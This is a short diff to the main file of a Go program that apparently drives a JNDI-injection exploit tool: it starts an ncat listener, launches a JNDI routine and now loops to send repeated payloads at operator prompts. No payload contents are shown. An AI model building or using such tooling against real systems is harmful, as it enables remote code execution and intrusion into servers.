@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"myapp/lib/execjndi"
 	"myapp/lib/ncat"
@@ -13,26 +14,26 @@ func main() {
 	banner()
 	ncat.StartNcat()
 	startPayload := make(chan bool)
-	// exitChan := make(chan bool)
+	exitChan := make(chan struct{})
 	go func() {
 		execjndi.ExecJNDI(startPayload)
 	}()
 	go func() {
 		<-startPayload
-		// 	for {
-		payload.PayloadInput()
-		// 		fmt.Println("Do you want to send another payload? (yes/no)")
-		// 		scanner := bufio.NewScanner(os.Stdin)
-		// 		if scanner.Scan() {
-		// 			response := scanner.Text()
-		// 			if response != "yes" {
-		// 				exitChan <- true
-		// 				break
-		// 			}
-		// 		}
-		// 	}
+		for {
+			payload.PayloadInput()
+			fmt.Println("Do you want to send another payload? (yes/no)")
+			scanner := bufio.NewScanner(os.Stdin)
+			if scanner.Scan() {
+				response := scanner.Text()
+				if response != "yes" {
+					close(exitChan)
+					break
+				}
+			}
+		}
 	}()
-	// <-exitChan
+	<-exitChan
 	fmt.Println("Exiting...")
 	os.Exit(0)
 }
